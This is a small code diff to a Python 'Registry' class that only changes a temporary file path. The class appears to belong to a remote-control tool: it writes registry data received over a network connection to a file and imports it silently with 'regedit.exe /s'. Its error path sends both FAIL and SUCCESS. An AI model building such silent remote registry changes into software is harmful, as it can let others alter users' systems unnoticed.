@@ -14,7 +14,7 @@ class Registry:
                 self.update_file_reg()
             elif cmd == "exit":
                 try:
-                    os.remove("src\\fileReg.reg") # remove dump
+                    os.remove("fileReg.reg") # remove dump
                 except:
                     pass
                 return
@@ -60,14 +60,14 @@ class Registry:
 
         data = data.decode("utf8")
         # print(data)
-        fi = open("src\\fileReg.reg", "w")
+        fi = open("fileReg.reg", "w")
         fi.write(data)
         fi.close()
         try:
-            os.popen("regedit.exe /s src\\fileReg.reg")
+            os.popen("regedit.exe /s fileReg.reg")
         except Exception:
             self.client.send(bytes("FAIL", "utf8"))
-            os.remove("src\\fileReg.reg")
+            os.remove("fileReg.reg")
         self.client.send(bytes("SUCCESS", "utf8"))
 
 
